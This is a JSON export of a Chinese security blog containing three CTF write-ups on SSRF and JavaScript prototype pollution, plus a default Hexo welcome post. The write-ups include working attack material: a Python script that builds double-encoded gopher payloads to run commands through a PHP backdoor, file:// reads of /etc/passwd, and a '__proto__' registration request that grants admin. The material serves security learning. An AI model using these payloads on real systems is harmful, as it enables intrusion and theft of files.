{"meta":{"title":"isum","subtitle":"","description":"","author":"isum","url":"https://ehzisum.github.io","root":"/"},"pages":[{"title":"关于页","date":"2024-04-26T23:27:22.000Z","updated":"2024-05-29T14:00:20.545Z","comments":true,"path":"about/index.html","permalink":"https://ehzisum.github.io/about/index.html","excerpt":"","text":"还没有"}],"posts":[{"title":"褥一把ctf系列之攻防世界ssrf-me","slug":"褥一把ctf系列之攻防世界ssrf-me","date":"2024-06-02T14:43:21.742Z","updated":"2024-06-02T14:50:13.869Z","comments":true,"path":"2024/06/02/褥一把ctf系列之攻防世界ssrf-me/","link":"","permalink":"https://ehzisum.github.io/2024/06/02/%E8%A4%A5%E4%B8%80%E6%8A%8Actf%E7%B3%BB%E5%88%97%E4%B9%8B%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cssrf-me/","excerpt":"","text":"一、wp抄一个别人的wp在这里： 1.URL双重编码 先来说第一种方式，简单粗暴，但很多wp没有解释清楚为什么这种编码可以绕过。 这里涉及到浏览器及URL编码解码过程。我们可以本地写一个简单的ssrf漏洞测试文件进行测试： 首先明确一个前提：服务器在接收到HTTP请求后会对其进行一次URL解码， 而file://协议和gopher://协议一样，在服务器发送请求前又会进行一次URL解码。 先分析GET方法，使用GET方法请求时浏览器并不会对请求参数编码，所以浏览器写fla%67提交到服务器后， 经过一次解码得到flag，后端检测不通过。而浏览器请求fla%2567（对%67二次编码）， 服务器一次解码得到fla%67，检测通过。然后再传给file协议时，在发送前再次解码，得到flag，成功找到文件。 然后分析POST请求：在使用HTML表单提交数据时，其Content-Type值默认为application/x-www-form-urlencoded， 表示表单的数据会以URL编码的形式进行传输。当然还有另一种multipart/form-data，这种类型一般用于文件上传或传输二进制数据。 所以当我们在浏览器中输入flag时，它会默认对特殊字符编码一次再发送给服务器，见下图。而服务器和处理GET请求一样，还是做了两次解码操作。 所以这就是为什么在浏览器采用POST请求file:///fla%67可以绕过的原因（因为发送给服务器之前已经编码为fla%2567）。 所以如果我们直接用burp的话，记得要两次编码才行（因为省去了浏览器的自动编码）。 2.Apache虚拟站点+任意命令执行 这部分是查看官方WP后测试总结的。网站指纹显示Apache中间件，那么我们可以尝试查看一下Apache的配置文件。 /etc/apache2/apache2.conf、/etc/apache2/sites-enabled/000-default.conf 前者是Apache的全局配置文件，这个应该都比较熟悉了。主要了解下后者：sites-enabled这个目录包含了启用的虚拟主机配置文件的符号链接。 在 Ubuntu 中，通过将虚拟主机配置文件的符号链接从 sites-available/ 目录复制到 sites-enabled/ 目录来启用虚拟主机。 而sites-available这个目录包含了可用的虚拟主机配置文件。每个配置文件对应一个虚拟主机，用于定义不同域名或主机的网站配置。 另外Apache还有一个配置文件：/etc/apache2/ports.conf用于查看Apache2服务监听的端口号。 我们发现还存在一个端口号为47852的虚拟主机，根目录为/var/www/htmlssrf123123， 于是查看下该网站的源代码：意外发现这里是php一句话，但是由于exec执行命令并不输出结果，所以需要将执行结果带外传输。 那么我们可以执行cat /fla? &gt; /tmp/f2ag将结果写入到f2ag文件中，然后再file协议读取。 PS：几种不同的命令执行函数的结果回显对比如下 另外还要解决如何向该页面发送post数据的问题，也即如何将一个post请求包装到当前http请求中。 这里很自然的想到ssrf中的gopher协议，通过gopher协议可以传送任意的TCP数据流。但要按照其协议格式包裹数据（不熟悉的可以再回顾一下）。脚本如下： import urllib.parse payload =\\ &quot;&quot;&quot;POST /index.php HTTP/1.1 Host: 127.0.0.1:47852 Content-Length: 25 Content-Type: application/x-www-form-urlencoded cmd=cat /fla? &gt; /tmp/f2ag &quot;&quot;&quot; #注意后面一定要有回车，回车结尾表示http请求结束 tmp = urllib.parse.quote(payload) new = tmp.replace(&#39;%0A&#39;,&#39;%0D%0A&#39;) result = &#39;gopher://127.0.0.1:47852/&#39;+&#39;_&#39;+new result = urllib.parse.quote(result) print(result) # 这里因为是GET\\POST 请求所以要进行两次url编码 然后顺理成章的拿到flag，不过需要注意一点，上面的脚本已经经过了二次编码了，所以可以直接放在burp下用，如果是放到浏览器form表单中用，反而又被编码了一次会导致无法识别协议内容造成写入失败。 二、知识点总结1.$_GET[]、$_POST[]、$_FILES[]、$_COOKIE[]、$_SESSION[] &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt; 当表单中包含 &lt;input type=&quot;file&quot;&gt; 元素并且该表单被提交时，上传的文件的信息就会被存储在 $_FILES 数组中 2.本题验证码获取 &lt;?php $m=1000; $captcha=58;//$captcha不能设为0，“0b6b93”在进行宽松的比较时会发生类型强制转换为0 while($captcha!=&quot;e84dd4&quot;)&#123; $captcha=substr(md5($m), -6, 6); $m++; &#125; $m-=1; echo$m; 3.url编码 payload文本格式会对编码产生影响，特别是在gopher这种一大段的数据包编码时 wp里的url编码解码细节 4.Apache配置 &#x2F;etc&#x2F;apache2&#x2F;apache2.conf Apache的全局配置文件 &#x2F;etc&#x2F;apache2&#x2F;ports.conf 用于查看Apache2服务监听的端口号","categories":[{"name":"刷题o比赛","slug":"刷题o比赛","permalink":"https://ehzisum.github.io/categories/%E5%88%B7%E9%A2%98o%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://ehzisum.github.io/tags/ssrf/"}]},{"title":"褥一把ctf系列之js原型链污染","slug":"褥一把ctf系列之js原型链污染","date":"2024-05-31T14:52:21.470Z","updated":"2024-06-01T08:37:19.477Z","comments":true,"path":"2024/05/31/褥一把ctf系列之js原型链污染/","link":"","permalink":"https://ehzisum.github.io/2024/05/31/%E8%A4%A5%E4%B8%80%E6%8A%8Actf%E7%B3%BB%E5%88%97%E4%B9%8Bjs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","excerpt":"","text":"CATCTF——wife_wife(攻防世界) 总结 页面巨可爱! 需要以admin登录进去 知识点：一.———————- 1.node.js创建新用户的常见方法 const express = require(&#39;express&#39;); const mongoose = require(&#39;mongoose&#39;); const bcrypt = require(&#39;bcrypt&#39;); // 连接MongoDB数据库 mongoose.connect(&#39;mongodb://localhost/mydatabase&#39;, &#123; useNewUrlParser: true, useUnifiedTopology: true, &#125;) .then(() =&gt; console.log(&#39;Connected to MongoDB...&#39;)) .catch(err =&gt; console.error(&#39;Could not connect to MongoDB...&#39;, err)); // 定义用户模型 const UserSchema = new mongoose.Schema(&#123; username: &#123; type: String, required: true, unique: true &#125;, password: &#123; type: String, required: true &#125;, &#125;); UserSchema.pre(&#39;save&#39;, function(next) &#123; const user = this; if (!user.isModified(&#39;password&#39;)) return next(); bcrypt.genSalt(10, (err, salt) =&gt; &#123; if (err) return next(err); bcrypt.hash(user.password, salt, (err, hash) =&gt; &#123; if (err) return next(err); user.password = hash; next(); &#125;); &#125;); &#125;); const User = mongoose.model(&#39;User&#39;, UserSchema); const app = express(); app.use(express.json()); app.post(&#39;/api/users&#39;, async (req, res) =&gt; &#123; const &#123; username, password &#125; = req.body; // 验证用户名和密码（这里只是简单示例） if (!username || !password) &#123; return res.status(400).json(&#123; error: &#39;Username and password are required&#39; &#125;); &#125; try &#123; const newUser = new User(&#123; username, password &#125;); await newUser.save(); res.status(201).json(newUser); &#125; catch (err) &#123; res.status(500).json(&#123; error: &#39;Failed to create user&#39; &#125;); &#125; &#125;); app.listen(3000, () =&gt; console.log(&#39;Server started on port 3000&#39;)); 2.关于js的对象：可以说 “JavaScript 对象是变量的容器”，但是，我们通常认为 “JavaScript 对象是键值对的容器” json.parse() 将json数据解析为js对象 (关于数据传输：body部分被 Express.js 的中间件body-parser解析为json数据) 3.object.assign()： Object.assign() - JavaScript | MDN (mozilla.org) 4.js原型链污染 继承与原型链 - JavaScript | MDN (mozilla.org) 浅析CTF中的Node.js原型链污染 - FreeBuf网络安全行业门户 //随便注册一个看看数据包 POST /register HTTP/1.1 Host: 61.147.171.105:49801 Content-Length: 47 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Origin: http://61.147.171.105:49801 Referer: http://61.147.171.105:49801/register.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close &#123;&quot;username&quot;:&quot;b&quot;,&quot;password&quot;:&quot;b&quot;,&quot;isAdmin&quot;:false&#125; //前端代码 &lt;script&gt; function register(username, password, inviteCode, isAdmin)&#123; let user = &#123;username, password, isAdmin&#125; if(isAdmin)&#123; if(!inviteCode)&#123; alert(&#39;invite code required&#39;) return &#125; user = &#123;...user, inviteCode&#125; &#125; fetch(&#39;/register&#39;, &#123; method: &#39;post&#39;, body: JSON.stringify(user) &#125;) .then(res =&gt; res.json()) .then(res =&gt; &#123; alert(res.msg) if(!res.err)&#123; location.href = &#39;/login&#39; &#125; &#125;) &#125; function handle_isAdmin_change(isAdmin)&#123; document.getElementById(&#39;div-invitecode&#39;).hidden = !isAdmin &#125; &lt;/script&gt; //wp里部分后端源码 app.post(&#39;/register&#39;, (req, res) =&gt; &#123; let user = JSON.parse(req.body) if (!user.username || !user.password) &#123; return res.json(&#123; msg: &#39;empty username or password&#39;, err: true &#125;) &#125; if (users.filter(u =&gt; u.username == user.username).length) &#123; return res.json(&#123; msg: &#39;username already exists&#39;, err: true &#125;) &#125; if (user.isAdmin &amp;&amp; user.inviteCode != INVITE_CODE) &#123; user.isAdmin = false return res.json(&#123; msg: &#39;invalid invite code&#39;, err: true &#125;) &#125; let newUser = Object.assign(&#123;&#125;, baseUser, user) //就是这里，原型链污染 users.push(newUser) res.json(&#123; msg: &#39;user created successfully&#39;, err: false &#125;) &#125;) //发包，注册成功 POST /register HTTP/1.1 Host: 61.147.171.105:49801 Content-Length: 62 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Origin: http://61.147.171.105:49801 Referer: http://61.147.171.105:49801/register.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close &#123;&quot;username&quot;:&quot;e&quot;,&quot;password&quot;:&quot;e&quot;,&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;","categories":[{"name":"刷题o比赛","slug":"刷题o比赛","permalink":"https://ehzisum.github.io/categories/%E5%88%B7%E9%A2%98o%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"js原型链污染","slug":"js原型链污染","permalink":"https://ehzisum.github.io/tags/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"}]},{"title":"褥一把ctf系列之ssrf-POST请求","slug":"褥一把ctf系列之ssrf-POST请求","date":"2024-05-31T13:07:55.311Z","updated":"2024-06-01T08:37:11.077Z","comments":true,"path":"2024/05/31/褥一把ctf系列之ssrf-POST请求/","link":"","permalink":"https://ehzisum.github.io/2024/05/31/%E8%A4%A5%E4%B8%80%E6%8A%8Actf%E7%B3%BB%E5%88%97%E4%B9%8Bssrf-POST%E8%AF%B7%E6%B1%82/","excerpt":"","text":"ctfhub技能树-ssrf-POST请求 解题记录 知识详解：SSRF漏洞原理攻击与防御(超详细总结)-CSDN博客 题目详解：CTFHub技能树 Web-SSRF篇（保姆级通过教程）_gopherus安装-CSDN博客 一、总结1.file:&#x2F;&#x2F; 绝对路径 url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd url&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;Windows&#x2F;win.ini url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php——2.http:&#x2F;&#x2F; 网络访问——3.gopher:&#x2F;&#x2F; 控制网络访问数据包 url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520%252Fflag.php%2520HTTP%252F1.1%250d%250aHost%253A%2520127.0.0.1%253A80%250d%250aContent-Length%253A%252036%250d%250aContent-Type%253A%2520application%252Fx-www-form-urlencoded%250d%250a%250d%250akey%253Dacb142cb4512d24ecd23cf3c040abd70——4.在PHP中，伪协议（pseudo-protocols）是一种特殊的语法，用于访问各种资源，如文件、网络、输入&#x2F;输出流等。 二、解题过程：1、——————- **-**举例php中可能存在SSRF漏洞的函数：file_get_contents()、sockopen()、curl_exec()、fopen()、readfile() (利用这些函数去请求) **-**在url中读取的内容不会再次被执行，而是直接返回内容 2、————————- 这里我不知道wp为什么突然访问127.0.0.1&#x2F;flag.php，可能是经验吧，发现了个输入框 3、——————- if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123; echo &quot;Just View From 127.0.0.1&quot;; return; &#125; //$_SERVER[&quot;REMOTE_ADDR&quot;] 这个 IP 地址是由 HTTP 请求头中的 Remote-Addr 字段提供的，通常是由用户的 ISP（互联网服务提供商）或代理服务器分配的 //尝试修改 HTTP 请求头中的 Remote-Addr 字段是无效的，因为Remote-Addr 不是标准的 HTTP 请求头字段。 //即使是可自定义的请求头（如 X-Forwarded-For），它们也只是被用作参考，并不会影响 $_SERVER[&quot;REMOTE_ADDR&quot;] 的值。 需要post数据：key&#x3D;acb142cb4512d24ecd23cf3c040abd70 ——gopher伪协议 |1.构造数据包 … POST &#x2F;flag.php HTTP&#x2F;1.1Host: 127.0.0.1:80Content-Length: 36Content-Type: application&#x2F;x-www-form-urlencoded key&#x3D;acb142cb4512d24ecd23cf3c040abd70 … 在使用 Gopher协议发送 POST请求包时，Host、Content-Type和Content-Length请求头是必不可少的，但在 GET请求中可以没有。 |2.对构造的请求包进行两次 URL编码 在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码第一次url编码 POST%20%2Fflag.php%20HTTP%2F1.1%0d%0aHost%3A%20127.0.0.1%3A80%0d%0aContent-Length%3A%2036%0d%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0d%0a%0d%0akey%3Dacb142cb4512d24ecd23cf3c040abd70 在第一次编码后的数据中，将%0A全部替换为%0D%0A。因为 Gopher协议包含的请求数据包中，可能包含有&#x3D;、&amp;等特殊字符，避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把%后的字节当做普通字节 第二次url编码 POST%2520%252Fflag.php%2520HTTP%252F1.1%250d%250aHost%253A%2520127.0.0.1%253A80%250d%250aContent-Length%253A%252036%250d%250aContent-Type%253A%2520application%252Fx-www-form-urlencoded%250d%250a%250d%250akey%253Dacb142cb4512d24ecd23cf3c040abd70 |3.payload http://challenge-4a31b39b2d878282.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%20%2Fflag.php%20HTTP%2F1.1%0d%0aHost%3A%20127.0.0.1%3A80%0d%0aContent-Length%3A%2036%0d%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0d%0a%0d%0akey%3Dacb142cb4512d24ecd23cf3c040abd70 4、——————- curl_exec()访问url之后返回的内容是个数据包耶 不同函数实现的ssrf有很多不同的地方","categories":[{"name":"刷题o比赛","slug":"刷题o比赛","permalink":"https://ehzisum.github.io/categories/%E5%88%B7%E9%A2%98o%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://ehzisum.github.io/tags/ssrf/"}]},{"title":"Hello World","slug":"hello-world","date":"2024-04-26T03:03:01.684Z","updated":"2024-05-29T14:35:28.177Z","comments":true,"path":"2024/04/26/hello-world/","link":"","permalink":"https://ehzisum.github.io/2024/04/26/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post&#x2F;page$ hexo new &quot;PostName&quot; $ hexo new page &quot;PageName&quot; More info: Writing Run server$ hexo server --port==8000 #开启访问（默认端口4000，`ctrl + c` 关闭），查看帮助（hexo server -help） More info: Server Generate static files$ hexo generate #生成静态页面至public目录 More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment","categories":[{"name":"洪秀全","slug":"洪秀全","permalink":"https://ehzisum.github.io/categories/%E6%B4%AA%E7%A7%80%E5%85%A8/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://ehzisum.github.io/tags/hexo/"}]}],"categories":[{"name":"刷题o比赛","slug":"刷题o比赛","permalink":"https://ehzisum.github.io/categories/%E5%88%B7%E9%A2%98o%E6%AF%94%E8%B5%9B/"},{"name":"洪秀全","slug":"洪秀全","permalink":"https://ehzisum.github.io/categories/%E6%B4%AA%E7%A7%80%E5%85%A8/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://ehzisum.github.io/tags/ssrf/"},{"name":"js原型链污染","slug":"js原型链污染","permalink":"https://ehzisum.github.io/tags/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"name":"hexo","slug":"hexo","permalink":"https://ehzisum.github.io/tags/hexo/"}]}